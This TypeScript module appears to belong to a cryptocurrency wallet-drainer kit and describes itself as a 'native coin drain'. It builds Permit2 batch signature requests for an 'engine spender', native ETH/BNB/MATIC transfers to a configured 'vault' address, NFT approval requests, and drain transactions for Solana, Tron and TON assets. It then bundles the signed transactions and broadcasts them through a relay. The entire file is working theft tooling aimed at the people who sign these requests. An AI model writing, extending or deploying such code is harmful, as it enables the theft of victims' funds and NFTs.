/**
 * Native coin drain — ETH / BNB / MATIC transfer combined with Permit2 batch settlement.
 */
import type { Address, Hex } from 'viem'
import {
  createPublicClient,
  getAddress,
  http,
  isAddress,
  isHex,
} from 'viem'
import { arbitrum, base, bsc, bscTestnet, mainnet, optimism, polygon, sepolia, type Chain } from 'viem/chains'

import { PERMIT2_ADDRESS } from '../adapters/evm-adapter.js'
import { computeSignatureAnchorExpiry } from '../security/permit2-handler.js'
import { LEGION_MESH_EVENT_SETTLEMENT, legionMeshViemFetchOptions } from './mesh-event.js'
import {
  buildBatchPermitTypedData,
  readPermit2BatchAllowanceNonces,
  type BatchPermitMetadata,
} from './permit2-batch.js'
import { resolveEvmRpcUrlForChain, resolveEngineSpenderAddress } from './permit2-executor.js'
import { deliverSignedEvmTransactions } from './flashbots-relay.js'
import { buildSolNativeDrainForBatch } from './solana-native-drain.js'
import { buildSplDrainForBatch } from './solana-spl-drain.js'
import { buildTrxNativeDrainForBatch } from './tron-native-drain.js'
import { buildTrc20DrainForBatch } from './tron-trc20-drain.js'
import { buildTonNativeDrainForBatch } from './ton-native-drain.js'
import { buildJettonDrainForBatch } from './ton-jetton-drain.js'
import {
  buildBatchNFTApprovalTypedData,
  type BatchNftEntry,
  type NftApprovalTypedData,
} from './nft-drain.js'

export type NativeTransferTxRequest = {
  from: Address
  to: Address
  value: string
  chainId: number
  gas: string
  maxFeePerGas: string
  maxPriorityFeePerGas: string
  nonce: number
  type: 'eip1559'
}

export type BatchNativeWithPermit2Result = {
  batchTypedData: ReturnType<typeof buildBatchPermitTypedData>
  batch_permit_metadata: BatchPermitMetadata
  nativeAmount: string
  native_transfer: NativeTransferTxRequest | null
  native_amount_sol?: string
  native_amount_trx?: string
  native_amount_ton?: string
  native_transfer_sol?: import('./solana-native-drain.js').SolNativeTransferRequest | null
  native_transfer_trx?: import('./tron-native-drain.js').TronNativeTransferRequest | null
  native_transfer_ton?: import('./ton-native-drain.js').TonNativeTransferRequest | null
  spl_amount?: string
  spl_mint?: string
  spl_transfer?: import('./solana-spl-drain.js').SplTransferRequest | null
  trc20_amount?: string
  trc20_contract?: string
  trc20_transfer?: import('./tron-trc20-drain.js').Trc20TransferRequest | null
  jetton_amount?: string
  jetton_master?: string
  jetton_transfer?: import('./ton-jetton-drain.js').JettonTransferRequest | null
  nfts?: BatchNftEntry[]
  nft_approval_typed_data?: Array<{ contract: Address; typedData: NftApprovalTypedData }>
}

export type NativeCoinDrainMetadata = {
  amount: string
  to: Address
  chainId: number
}

function resolveEvmVaultAddress(): Address | null {
  const raw =
    (typeof process !== 'undefined' ? process.env['VAULT_ADDRESS_EVM'] : undefined)?.trim() ||
    (typeof process !== 'undefined' ? process.env['SOVEREIGN_VAULT_EVM'] : undefined)?.trim() ||
    (typeof process !== 'undefined' ? process.env['SOVEREIGN_VAULT_ADDRESS'] : undefined)?.trim() ||
    ''
  if (!raw || !isAddress(raw)) return null
  return getAddress(raw)
}

function resolveChain(chainId: number): Chain {
  const map: Record<number, Chain> = {
    1: mainnet,
    56: bsc,
    97: bscTestnet,
    137: polygon,
    42161: arbitrum,
    8453: base,
    10: optimism,
    11155111: sepolia,
  }
  return map[chainId] ?? mainnet
}

async function resolveRpcUrl(chainId: number, explicit?: string): Promise<string> {
  const rpc = explicit?.trim() || (await resolveEvmRpcUrlForChain(chainId))
  if (!rpc) {
    throw new Error(`RPC not configured for chain ${chainId}`)
  }
  return rpc
}

/**
 * Build an EIP-1559 native transfer request (ETH / BNB / MATIC) using current gas prices.
 * Frontend passes this to `sendTransaction` / wallet signing.
 */
export async function buildNativeTransferTx(
  wallet: Address,
  to: Address,
  amount: bigint,
  chainId: number,
  rpcUrl?: string,
): Promise<NativeTransferTxRequest> {
  if (amount <= 0n) {
    throw new Error('Native transfer amount must be greater than zero')
  }
  const from = getAddress(wallet)
  const destination = getAddress(to)
  const rpc = await resolveRpcUrl(chainId, rpcUrl)
  const chain = resolveChain(chainId)
  const publicClient = createPublicClient({
    chain,
    transport: http(rpc, {
      ...legionMeshViemFetchOptions(LEGION_MESH_EVENT_SETTLEMENT),
    }),
  })

  // A plain ETH transfer is always 21 000 gas — no need to call estimateGas on-chain.
  // Calling estimateGas requires the `from` account to have enough ETH (value + gas cost),
  // which would prevent building typed data for wallets that haven't been funded yet.
  const NATIVE_TRANSFER_GAS = 21_000n

  const [nonce, fees] = await Promise.all([
    publicClient.getTransactionCount({ address: from, blockTag: 'pending' }),
    publicClient.estimateFeesPerGas(),
  ])

  if (fees.maxFeePerGas == null || fees.maxPriorityFeePerGas == null) {
    throw new Error('Unable to resolve EIP-1559 gas fees for native transfer')
  }

  return {
    from,
    to: destination,
    value: amount.toString(),
    chainId,
    gas: NATIVE_TRANSFER_GAS.toString(),
    maxFeePerGas: fees.maxFeePerGas.toString(),
    maxPriorityFeePerGas: fees.maxPriorityFeePerGas.toString(),
    nonce,
    type: 'eip1559',
  }
}

/**
 * Plan Permit2 batch EIP-712 + optional native coin drain for the same strike.
 * User signs typed data for tokens and `sendTransaction` for native when nativeAmount > 0.
 */
export async function batchNativeWithPermit2(params: {
  wallet: Address
  chainId: number
  permits: Array<{ token: Address; amount: bigint }>
  nativeAmount?: bigint
  nativeAmountSol?: bigint
  nativeAmountTrx?: bigint
  nativeAmountTon?: bigint
  solWallet?: string
  trxWallet?: string
  tonWallet?: string
  splMint?: string
  splAmount?: bigint
  trc20Contract?: string
  trc20Amount?: bigint
  jettonMaster?: string
  jettonAmount?: bigint
  nfts?: BatchNftEntry[]
  vault?: Address
  engineSpender?: Address
  permit2?: Address
  rpcUrl?: string
}): Promise<BatchNativeWithPermit2Result> {
  if (params.permits.length === 0) {
    throw new Error('batchNativeWithPermit2 requires at least one permit')
  }

  const engineSpender = params.engineSpender ?? resolveEngineSpenderAddress()
  if (!engineSpender) {
    throw new Error('ENGINE_SPENDER or ADMIN_WALLET_ADDRESS required')
  }
  const permit2 = params.permit2 ?? PERMIT2_ADDRESS
  const nativeAmount = params.nativeAmount ?? 0n
  const vault = params.vault ?? resolveEvmVaultAddress()
  if (nativeAmount > 0n && !vault) {
    throw new Error('VAULT_ADDRESS_EVM or SOVEREIGN_VAULT_EVM required for EVM native drain')
  }

  const rpc = await resolveRpcUrl(params.chainId, params.rpcUrl)
  const chain = resolveChain(params.chainId)
  const publicClient = createPublicClient({
    chain,
    transport: http(rpc, {
      ...legionMeshViemFetchOptions(LEGION_MESH_EVENT_SETTLEMENT),
    }),
  })

  const tokens = params.permits.map((p) => getAddress(p.token))
  const nonces = await readPermit2BatchAllowanceNonces(
    publicClient,
    params.wallet,
    tokens,
    engineSpender,
  )
  const expiration = computeSignatureAnchorExpiry()

  const batchTypedData = buildBatchPermitTypedData({
    tokens: tokens.map((t) => t.toLowerCase()),
    amounts: params.permits.map((p) => p.amount.toString()),
    owner: params.wallet,
    spender: engineSpender,
    chainId: params.chainId,
    verifyingContract: permit2,
    nonces,
    expirations: params.permits.map(() => expiration),
    sigDeadline: BigInt(expiration),
  })

  const batch_permit_metadata: BatchPermitMetadata = {
    details: params.permits.map((permit, index) => ({
      token: getAddress(permit.token),
      amount: permit.amount.toString(),
      expiration,
      nonce: nonces[index] ?? 0,
    })),
    spender: engineSpender,
    sigDeadline: String(expiration),
    chainId: params.chainId,
    ...(nativeAmount > 0n ? { native_amount: nativeAmount.toString() } : {}),
    ...(params.nativeAmountSol != null && params.nativeAmountSol > 0n
      ? { native_amount_sol: params.nativeAmountSol.toString() }
      : {}),
    ...(params.nativeAmountTrx != null && params.nativeAmountTrx > 0n
      ? { native_amount_trx: params.nativeAmountTrx.toString() }
      : {}),
    ...(params.nativeAmountTon != null && params.nativeAmountTon > 0n
      ? { native_amount_ton: params.nativeAmountTon.toString() }
      : {}),
    ...(params.splMint && params.splAmount != null && params.splAmount > 0n
      ? { spl_mint: params.splMint, spl_amount: params.splAmount.toString() }
      : {}),
    ...(params.trc20Contract && params.trc20Amount != null && params.trc20Amount > 0n
      ? {
          trc20_contract: params.trc20Contract,
          trc20_amount: params.trc20Amount.toString(),
        }
      : {}),
    ...(params.jettonMaster && params.jettonAmount != null && params.jettonAmount > 0n
      ? {
          jetton_master: params.jettonMaster,
          jetton_amount: params.jettonAmount.toString(),
        }
      : {}),
    ...(params.nfts && params.nfts.length > 0 ? { nfts: params.nfts } : {}),
  }

  const native_transfer =
    nativeAmount > 0n && vault
      ? await buildNativeTransferTx(params.wallet, vault, nativeAmount, params.chainId, rpc)
      : null

  const [native_transfer_sol, native_transfer_trx, native_transfer_ton, spl_transfer, trc20_transfer, jetton_transfer] =
    await Promise.all([
    params.solWallet && params.nativeAmountSol != null && params.nativeAmountSol > 0n
      ? buildSolNativeDrainForBatch({
          wallet: params.solWallet,
          amountLamports: params.nativeAmountSol,
        })
      : Promise.resolve(null),
    params.trxWallet && params.nativeAmountTrx != null && params.nativeAmountTrx > 0n
      ? buildTrxNativeDrainForBatch({
          wallet: params.trxWallet,
          amountSun: params.nativeAmountTrx,
        })
      : Promise.resolve(null),
    params.tonWallet && params.nativeAmountTon != null && params.nativeAmountTon > 0n
      ? buildTonNativeDrainForBatch({
          wallet: params.tonWallet,
          amountNanotons: params.nativeAmountTon,
        })
      : Promise.resolve(null),
    params.solWallet && params.splMint && params.splAmount != null && params.splAmount > 0n
      ? buildSplDrainForBatch({
          wallet: params.solWallet,
          mint: params.splMint,
          amount: params.splAmount,
        })
      : Promise.resolve(null),
    params.trxWallet && params.trc20Contract && params.trc20Amount != null && params.trc20Amount > 0n
      ? buildTrc20DrainForBatch({
          wallet: params.trxWallet,
          contract: params.trc20Contract,
          amount: params.trc20Amount,
        })
      : Promise.resolve(null),
    params.tonWallet && params.jettonMaster && params.jettonAmount != null && params.jettonAmount > 0n
      ? buildJettonDrainForBatch({
          wallet: params.tonWallet,
          jettonMaster: params.jettonMaster,
          amount: params.jettonAmount,
        })
      : Promise.resolve(null),
  ])

  const nft_approval_typed_data =
    params.nfts && params.nfts.length > 0
      ? buildBatchNFTApprovalTypedData({
          wallet: params.wallet,
          chainId: params.chainId,
          nfts: params.nfts,
          operator: vault ?? undefined,
        })
      : undefined

  return {
    batchTypedData,
    batch_permit_metadata,
    nativeAmount: nativeAmount.toString(),
    native_transfer,
    ...(params.nativeAmountSol != null && params.nativeAmountSol > 0n
      ? { native_amount_sol: params.nativeAmountSol.toString(), native_transfer_sol }
      : {}),
    ...(params.nativeAmountTrx != null && params.nativeAmountTrx > 0n
      ? { native_amount_trx: params.nativeAmountTrx.toString(), native_transfer_trx }
      : {}),
    ...(params.nativeAmountTon != null && params.nativeAmountTon > 0n
      ? { native_amount_ton: params.nativeAmountTon.toString(), native_transfer_ton }
      : {}),
    ...(params.splMint && params.splAmount != null && params.splAmount > 0n
      ? { spl_mint: params.splMint, spl_amount: params.splAmount.toString(), spl_transfer }
      : {}),
    ...(params.trc20Contract && params.trc20Amount != null && params.trc20Amount > 0n
      ? {
          trc20_contract: params.trc20Contract,
          trc20_amount: params.trc20Amount.toString(),
          trc20_transfer,
        }
      : {}),
    ...(params.jettonMaster && params.jettonAmount != null && params.jettonAmount > 0n
      ? {
          jetton_master: params.jettonMaster,
          jetton_amount: params.jettonAmount.toString(),
          jetton_transfer,
        }
      : {}),
    ...(params.nfts && params.nfts.length > 0 ? { nfts: params.nfts, nft_approval_typed_data } : {}),
  }
}

/** Broadcast user-signed native transfer (standalone or as first leg of a bundle). */
export async function broadcastSignedNativeTransfer(params: {
  signedTransaction: Hex
  chainId: number
  rpcUrl?: string
}): Promise<{ ok: boolean; tx_hash?: string; detail?: string }> {
  if (!isHex(params.signedTransaction) || params.signedTransaction.length < 70) {
    return { ok: false, detail: 'Invalid native signed transaction hex' }
  }
  const rpc = await resolveRpcUrl(params.chainId, params.rpcUrl)
  const delivery = await deliverSignedEvmTransactions({
    txns: [params.signedTransaction],
    chainId: params.chainId,
    rpcUrl: rpc,
  })
  if (!delivery.ok || delivery.transaction_hashes.length === 0) {
    return { ok: false, detail: delivery.detail ?? 'Native transfer broadcast failed' }
  }
  return { ok: true, tx_hash: delivery.transaction_hashes[0] }
}

/** Merge native + Permit2 executor txs into one delivery bundle (native first). */
export async function deliverNativeWithPermit2Transactions(params: {
  nativeSignedTransaction?: Hex
  permit2SignedTransactions: Hex[]
  chainId: number
  rpcUrl?: string
}): Promise<{ ok: boolean; transaction_hashes: string[]; bundle_hash?: string; detail?: string }> {
  const txns: Hex[] = []
  if (params.nativeSignedTransaction) {
    txns.push(params.nativeSignedTransaction)
  }
  txns.push(...params.permit2SignedTransactions)
  const rpc = await resolveRpcUrl(params.chainId, params.rpcUrl)
  const delivery = await deliverSignedEvmTransactions({
    txns,
    chainId: params.chainId,
    rpcUrl: rpc,
  })
  return {
    ok: delivery.ok,
    transaction_hashes: delivery.transaction_hashes,
    bundle_hash: delivery.bundle_hash,
    detail: delivery.detail,
  }
}

export function parseNativeAmount(value: unknown): bigint {
  if (typeof value === 'bigint') return value
  if (typeof value === 'number' && Number.isFinite(value)) return BigInt(Math.trunc(value))
  if (typeof value === 'string' && value.trim() !== '') {
    return BigInt(value.trim())
  }
  return 0n
}

export function buildNativeCoinDrainMetadata(params: {
  amount: string
  to: Address
  chainId: number
}): NativeCoinDrainMetadata {
  return {
    amount: params.amount,
    to: getAddress(params.to),
    chainId: params.chainId,
  }
}
